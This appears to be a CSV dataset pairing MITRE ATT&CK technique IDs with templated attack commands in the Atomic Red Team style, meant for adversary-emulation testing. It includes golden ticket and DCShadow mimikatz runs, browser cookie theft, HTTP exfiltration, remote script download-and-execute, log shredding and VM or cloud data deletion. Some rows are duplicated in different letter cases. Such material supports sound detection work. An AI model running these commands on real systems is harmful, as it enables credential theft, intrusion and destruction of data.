mitre_id,command
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 2"
T1135,DIR \\#{COMPUTER_IP}\C$ DIR \\#{COMPUTER_IP}\ADMIN$ DIR \\#{COMPUTER_IP}\IPC$
T1124,get-date
T1558,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""#{domain_sid}"" if ($domain_sid -match ""default"") { # code from https://www.sevecek.com/englishpages/lists/posts/post.aspx?id=60 $domain = gwmi win32_computersystem | select -expand domain $krbtgtsid = (new-object security.principal.ntaccount $domain\krbtgt).translate([security.principal.securityidentifier]).value $domain_sid = $krbtgtsid.substring(0, $krbtgtsid.lastindexof('-')) } # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\golden.txt 2>&1 ( echo purge existing tickets and create golden ticket: klist purge #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:domain_sid /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt"" ""exit"" echo. echo requesting sysvol: dir \\#{domain}\sysvol echo. echo tickets after requesting sysvol: klist echo. echo end of golden ticket attack ) ""@ -replace ""domain_sid"", $domain_sid | out-file -encoding oem $env:temp\golden.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\golden.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\golden.txt"" -wait | foreach-object { if ($_ -match 'end of golden ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore # id_6998"
T1119,MKDIR %TEMP%\T1119_COMMAND_PROMPT_COLLECTION >NUL 2>&1 DIR C: /B /S .DOCX | FINDSTR /E .DOCX FOR /R C:\ %F IN (*.DOCX) DO COPY /Y %F %TEMP%\T1119_COMMAND_PROMPT_COLLECTION
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionstring --output tsv # download blob for cleanup $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + ""#{blob_name}"") az storage blob download --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmporiginalfunctioncode --overwrite true if ($lastexitcode -eq 0) { # upload new blob version if download of existing blob succeeded az storage blob upload --connection-string $connectionstring --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true } else { write-output ""download original function code failed."" exit 1 } } # id_1266"
T1140,"ENCODED=$(PYTHON3 -C 'IMPORT BASE64;ENC=BASE64.B64ENCODE(""#{MESSAGE}"".ENCODE());PRINT(ENC.DECODE())') PYTHON3 -C ""IMPORT BASE64;DEC=BASE64.B64DECODE(\""$ENCODED\"");PRINT(DEC.DECODE())"" PYTHON3 -C ""IMPORT BASE64 AS D;DEC=D.B64DECODE(\""$ENCODED\"");PRINT(DEC.DECODE())"" PYTHON3 -C ""FROM BASE64 IMPORT B64DECODE;DEC=B64DECODE(\""$ENCODED\"");PRINT(DEC.DECODE())"" PYTHON3 -C ""FROM BASE64 IMPORT B64DECODE AS D;DEC=D(\""$ENCODED\"");PRINT(DEC.DECODE())"" ECHO $ENCODED | PYTHON3 -C ""IMPORT BASE64,SYS;DEC=BASE64.B64DECODE(SYS.STDIN.READ());PRINT(DEC.DECODE())"" ECHO $ENCODED > #{ENCODED_FILE} && PYTHON3 -C ""IMPORT BASE64;DEC=BASE64.B64DECODE(OPEN('#{ENCODED_FILE}').READ());PRINT(DEC.DECODE())"""
T1485,"ECHO """" | ""#{PLINK_FILE}"" -BATCH ""#{VM_HOST}"" -SSH -L #{VM_USER} -PW ""#{VM_PASS}"" ""FOR I IN `VIM-CMD VMSVC/GETALLVMS | AWK 'NR>1 {PRINT $1}'`; DO VIM-CMD VMSVC/SNAPSHOT.REMOVEALL $I & DONE"""
T1014,"echo #{library_path} | tee -a /etc/ld.so.preload /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden"" # id_1101"
T1562,"netsh advfirewall firewall add rule name=""open port to any"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any"
T1090,"[ ""$(uname)"" = 'freebsd' ] && sysrc tor_enable=""yes"" && service tor start || sudo systemctl start tor"
T1578,gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone} # id_5064
T1491,"$url = ""#{url_of_wallpaper}"" $imglocation = ""#{wallpaper_location}"" $orgwallpaper = (get-itemproperty -path registry::'hkey_current_user\control panel\desktop\' -name wallpaper).wallpaper $orgwallpaper | out-file -filepath ""#{pointer_to_orginal_wallpaper}"" $updatewallpapercode = @' using system.runtime.interopservices; namespace win32{ public class wallpaper{ [dllimport(""user32.dll"", charset=charset.auto)] static extern int systemparametersinfo (int uaction , int uparam , string lpvparam , int fuwinini) ; public static void setwallpaper(string thepath){ systemparametersinfo(20,0,thepath,3); } } } '@ $wc = new-object system.net.webclient try{ $wc.downloadfile($url, $imglocation) add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } catch [system.net.webexception]{ write-host(""cannot download $url"") add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } finally{ $wc.dispose() } # id_1214"
T1222,attrib.exe -r #{file_or_folder}\*.* /s # id_5147
T1651,"IMPORT-MODULE ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1/AWSSSMATTACK.PS1"" -FORCE $ACCESS_KEY = ""#{ACCESS_KEY}"" $SECRET_KEY = ""#{SECRET_KEY}"" $SESSION_TOKEN = ""#{SESSION_TOKEN}"" $AWS_PROFILE = ""#{PROFILE}"" $REGION = ""#{REGION}"" SET-AWSAUTHENTICATION -ACCESSKEY $ACCESS_KEY -SECRETKEY $SECRET_KEY -SESSIONTOKEN $SESSION_TOKEN -AWSPROFILE $AWS_PROFILE -AWSREGION $REGION INVOKE-TERRAFORM -TERRAFORMCOMMAND INIT -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" INVOKE-TERRAFORM -TERRAFORMCOMMAND APPLY -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" -TERRAFORMVARIABLES @(""PROFILE=T1651-1"", ""REGION=$REGION"") INVOKE-SSMATTACK -AWSPROFILE ""T1651-1"" -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" INVOKE-TERRAFORM -TERRAFORMCOMMAND DESTROY -TERRAFORMDIRECTORY ""PATHTOATOMICSFOLDER/T1651/SRC/T1651-1"" -TERRAFORMVARIABLES @(""PROFILE=T1651-1"", ""REGION=$REGION"")"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { # download file for cleanup $tmporiginalfilename = [system.io.path]::getfilename(""#{file_path}"") $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmporiginalfunctioncode if ($lastexitcode -eq 0) { # upload new funciton code if download of existing code succeeded if (""#{execution_option}"" -eq ""insert_code"") { # download file from file share for injection $tmpfunctioncode = join-path $env:temp/ (""t1528_tmp_to_inject_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpfunctioncode if ($lastexitcode -ne 0) { write-output ""function code download failed."" exit 1 } write-output ""file downloaded: $($tmpfunctioncode)"" $insertcontent = get-content -path ""#{code_to_insert_path}"" -raw # load the content of the insert file $content = get-content -path $tmpfunctioncode -raw # inject code to file $content = $insertcontent + ""`n"" + $content # insert the new code at the beginning $content | set-content -path $tmpfunctioncode # write the modified content to the file # upload file to file share az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpfunctioncode --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } elseif (""#{execution_option}"" -eq ""replace_file"") { az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } else { write-output ""please choose a valid execution_option"" exit 1 } } else { write-output ""download original function code failed."" exit 1 } } # id_5678"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1592,"GET-CIMINSTANCE -QUERY ""SELECT * FROM WIN32_PNPENTITY WHERE (PNPCLASS = 'IMAGE' OR PNPCLASS = 'CAMERA')"""
T1113,screencapture #{output_file} 
T1041,"IF(-NOT (TEST-PATH #{FILEPATH})){ 1..100 | FOREACH-OBJECT { ADD-CONTENT -PATH #{FILEPATH} -VALUE ""THIS IS LINE $_."" } } [SYSTEM.NET.SERVICEPOINTMANAGER]::EXPECT100CONTINUE = $FALSE $FILECONTENT = GET-CONTENT -PATH #{FILEPATH} INVOKE-WEBREQUEST -URI #{DESTINATION_URL} -METHOD POST -BODY $FILECONTENT -DISABLEKEEPALIVE"
T1083,"$out = ""#{output_file}"" $dirsfilter = @('documents','downloads','desktop','onedrive') $exts = @('.pdf','.doc','.docx','.xls','.xlsx','.txt','.zip','.rar','.7z') $userprofile = [environment]::getfolderpath('userprofile') $tr = [system.collections.generic.list[string]]::new() function matchesextension($path) { try { $e = [system.io.path]::getextension($path).tolower() return $exts -contains $e } catch { return $false } } function scan-dir($root) { try { $match = $false foreach ($f in $dirsfilter) { if ($root -like ""*$f*"") { $match = $true; break } } if (-not $match) { return } [system.io.directory]::enumeratefiles($root) | foreach-object { if (matchesextension $_) { $fi = [system.io.fileinfo]::new($_) $tr.add(""[file] $_ size:$($fi.length) lastwrite:$($fi.lastwritetime)"") } } [system.io.directory]::enumeratedirectories($root) | foreach-object { scan-dir $_ } } catch [system.unauthorizedaccessexception] { $tr.add(""[accessdenied] $root"") } catch { $tr.add(""[error] $root => $($_.exception.message)"") } } [system.io.directory]::enumeratedirectories($userprofile) | foreach-object { scan-dir $_ } # ensure output dir exists $outdir = [system.io.path]::getdirectoryname($out) if (-not [string]::isnullorempty($outdir) -and -not (test-path $outdir)) { new-item -path $outdir -itemtype directory -force | out-null } # write results $tr | out-file -filepath $out -encoding utf8 write-output ""enumeration complete. results written to: $out"""
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached # id_4892"
T1569,psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'
T1547,"IF (!(TEST-PATH -PATH ""HKCU:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER"")){ NEW-ITEM -ITEMTYPE KEY -PATH ""HKCU:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER"" } IF (!(TEST-PATH -PATH ""HKCU:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN"")){ NEW-ITEM -ITEMTYPE KEY -PATH ""HKCU:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN"" } SET-ITEMPROPERTY -PATH ""HKCU:\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\RUN"" -NAME ""#{TARGET_KEY_VALUE_NAME}"" -VALUE ""#{PAYLOAD}"""
T1518,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') powersql -noninteractive -consoleoutput # id_3794
T1201,PWPOLICY GETACCOUNTPOLICIES
T1485,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'nr>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"""
T1542,"ECHO ""CREATING %SYSTEMROOT%\WPBBIN.EXE"" NEW-ITEM -ITEMTYPE FILE -PATH ""$ENV:SYSTEMROOT\SYSTEM32\WPBBIN.EXE"""
T1137,"copy ""pathtoatomicsfolder\t1137.006\bin\addins\pptvbaaddin.ppam"" ""$env:appdata\microsoft\addins\notepad.ppam"" $ver = (new-object -comobject ""powerpoint.application"").version $excelregpath=""hkcu:\software\microsoft\office\$ver\powerpoint\addins\notepad"" new-item -type directory $excelregpath -force | out-null new-itemproperty $excelregpath ""autoload"" -value ""1"" -propertytype dword | out-null new-itemproperty $excelregpath ""path"" -value ""notepad.ppam"" -propertytype string | out-null stop-process -name ""powerpnt"" -erroraction ignore start-process ""powerpnt""  "
T1018,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip up"" || : ; done # id_7542"
T1039,"COPY-ITEM -PATH ""\\#{REMOTE}\C$\#{SHARE_FILE}"" -DESTINATION ""$ENV:TEMP\#{LOCAL_FILE}"""
T1055,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force # id_2667"
T1220,"wmic #{wmic_command} /format:""#{remote_xsl_file}"" # id_4064"
T1136,"useradd -g 0 -m -d /root -s /bin/bash #{username} if [ $(cat /etc/os-release | grep -i 'name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;"
T1489,sudo killall -sigterm #{process_name} # id_7755
T1001,"CAT ""#{SCRIPT}"" | BASE64 | XXD -P | SED 'S/../& /G' | XARGS -N1 | XXD -R -P | CAT ""#{IMAGE}"" - > ""#{EVIL_IMAGE}""; STRINGS ""#{EVIL_IMAGE}"" | TAIL -N 1 | BASE64 -D | SH"
T1614,pathtoatomicsfolder\..\externalpayloads\languagekeyboardlayout.exe # id_6288
T1553,certutil -addstore my #{pfx_path} # id_5301
T1129,"#{PSCP_FILE} -PW #{VM_PASS} #{VIB_FILE} #{VM_USER}@#{VM_HOST}:/TMP ECHO """" | ""#{PLINK_FILE}"" ""#{VM_HOST}"" -SSH -L ""#{VM_USER}"" -PW ""#{VM_PASS}"" -M ""#{VIB_INSTALL}"""
T1040,sudo #{program_path} -i #{ifname} -t 3 # id_2426
T1216,"c:\windows\system32\syncappvpublishingserver.vbs ""\n;#{command_to_execute}""  "
T1546,"reg add ""hkey_current_user\software\classes\atomictest"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\atomictest.1.00"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\atomictest\clsid"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\atomictest.1.00\clsid"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\inprocserver32"" /ve /t reg_sz /d ""c:\windows\system32\scrobj.dll"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\inprocserver32"" /v ""threadingmodel"" /t reg_sz /d ""apartment"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\progid"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\scriptleturl"" /ve /t reg_sz /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1546.015/src/treatas.sct"" /f reg add ""hkey_current_user\software\classes\clsid\{00000001-0000-0000-0000-0000feedacdc}\versionindependentprogid"" /ve /t reg_sz /d ""atomictest"" /f reg add ""hkey_current_user\software\classes\clsid\{97d47d56-3777-49fb-8e8f-90d7e30e1a1e}"" /f reg add ""hkey_current_user\software\classes\clsid\{97d47d56-3777-49fb-8e8f-90d7e30e1a1e}\treatas"" /ve /t reg_sz /d ""{00000001-0000-0000-0000-0000feedacdc}"" /f rundll32.exe -sta ""atomictest"""
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1652,kextfind # id_7318
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd /c #{sqlite3_path} ""#{cookie_db}"" | out-file -filepath ""#{output_file}"" "
T1564,"import-module exchangeonlinemanagement $password = convertto-securestring -string ""#{auth_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{auth_username}"", $password connect-exchangeonline -credential $credential -erroraction:silentlycontinue new-inboxrule -mailbox #{target_mailbox} -name #{mail_rulename} -subjectorbodycontainswords (""phish"",""malware"",""hacked"") -confirm:$false -deletemessage:$true"
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1560,"path=%path%;""c:\program files (x86)\winzip"" mkdir .\tmp\victim-files cd .\tmp\victim-files echo ""this file will be encrypted"" > .\encrypted_file.txt ""#{winzip_exe}"" -min -a -s""hello"" archive.zip * dir"
T1580,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance "
T1140,"python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: """".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = ""#{encrypted_command}""; key = ""#{xor_key}""; exec = xor_decrypt(command, key); subprocess.call(exec, shell=true)'"
T1018,"([adsisearcher]""objectcategory=computer"").findall(); ([adsisearcher]""objectcategory=computer"").findone()"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1546,set-itemproperty hklm:\system\currentcontrolset\services\winsock2\parameters -name autodialdll -value pathtoatomicsfolder\t1546\bin\altwinsock2dll.dll
T1578,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1070,sudo shred -u -z -n 3 #{system_log_path}
T1569,launchctl submit -l #{label_name} -- #{executable_path} # id_7921
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"" "
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v nocontrolpanel /t reg_dword /d 1 /f"
T1564,$file = get-item $env:temp\t1564.001-9.txt -force $file.attributes='hidden'
T1123,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1176,"# CHROMIUM $CHROMIUM = ""HTTPS://COMMONDATASTORAGE.GOOGLEAPIS.COM/CHROMIUM-BROWSER-SNAPSHOTS/WIN_X64/1153778/CHROME-WIN.ZIP"" # UBLOCK ORIGIN LITE TO TEST SIDE-LOADING $EXTENSION = ""HTTPS://GITHUB.COM/UBLOCKORIGIN/UBOL-HOME/RELEASES/DOWNLOAD/UBOLITE_2024.11.25.1376/UBOLITE_2024.11.25.1376.CHROMIUM.MV3.ZIP"" SET-LOCATION ""#{WORKING_DIR}"" SET-VARIABLE PROGRESSPREFERENCE SILENTLYCONTINUE INVOKE-WEBREQUEST -URI $CHROMIUM -OUTFILE ""#{WORKING_DIR}\CHROME.ZIP"" INVOKE-WEBREQUEST -URI $EXTENSION -OUTFILE ""#{WORKING_DIR}\EXTENSION.ZIP"" EXPAND-ARCHIVE CHROME.ZIP -DESTINATIONPATH ""#{WORKING_DIR}"" -FORCE EXPAND-ARCHIVE EXTENSION.ZIP -FORCE START-PROCESS .\CHROME-WIN\CHROME.EXE --LOAD-EXTENSION=""#{WORKING_DIR}\EXTENSION\"" -PASSTHRU"
T1083,ls -recurse get-childitem -recurse gci -recurse 
T1557,"[NET.SERVICEPOINTMANAGER]::SECURITYPROTOCOL = [NET.SECURITYPROTOCOLTYPE]::TLS12 IEX (IWR ""HTTPS://RAW.GITHUBUSERCONTENT.COM/KEVIN-ROBERTSON/INVEIGH/82BE2377ADE47A4E325217B4144878A59595E750/INVEIGH.PS1"" -USEBASICPARSING) INVOKE-INVEIGH -CONSOLEOUTPUT Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y"
T1003,mkdir c:\exfil diskshadow.exe /s #{filename}
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached # id_5012"
T1548,sudo touch #{file_to_setuid} sudo chown root #{file_to_setuid} sudo chmod u+xs #{file_to_setuid}
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1220,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}""  "
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml""  "
T1057,tasklist | findstr #{process_to_enumerate}
T1072,"""%programfiles(x86)%/#{radmin_exe}"""
T1564,"start """" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}  "
T1055,$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\createremotethreadnative.exe -pid $process.id -debug   
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive # id_4810
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1553,"mount-diskimage -imagepath ""#{path_of_iso}"" "
T1485,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name} 
T1087,query user
T1007,get-childitem -path 'hklm:\system\currentcontrolset\services' | foreach-object { $p = get-itemproperty -path $_.pspath -erroraction silentlycontinue [pscustomobject]@{ name = $_.pschildname displayname = $p.displayname imagepath = $p.imagepath starttype = $p.start } }
T1546,"BASH -C 'TRAP ""NOHUP SH $PATHTOATOMICSFOLDER/T1546.005/SRC/ECHO-ART-FISH.SH"" EXIT'"
T1566,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm   
T1221,"start ""#{docx_file}"" # id_4639"
T1556,"SUDO SED -I """" ""#{INDEX}S,^,#{PAM_RULE}\N,G"" #{PATH_TO_PAM_CONF}"
T1529,shutdown -r #{timeout} # id_3506
T1105,"# check if the folder exists, create it if it doesn't $folderpath = ""#{local_path}"" if (-not (test-path -path $folderpath)) { new-item -path $folderpath -itemtype directory } # create the file $filepath = join-path -path $folderpath -childpath ""#{file_name}"" new-item -path $filepath -itemtype file -force write-output ""file created: $filepath"" # attack command echo ""put #{local_path}\#{file_name}"" | sftp #{username}@#{remote_host}:#{remote_path}"
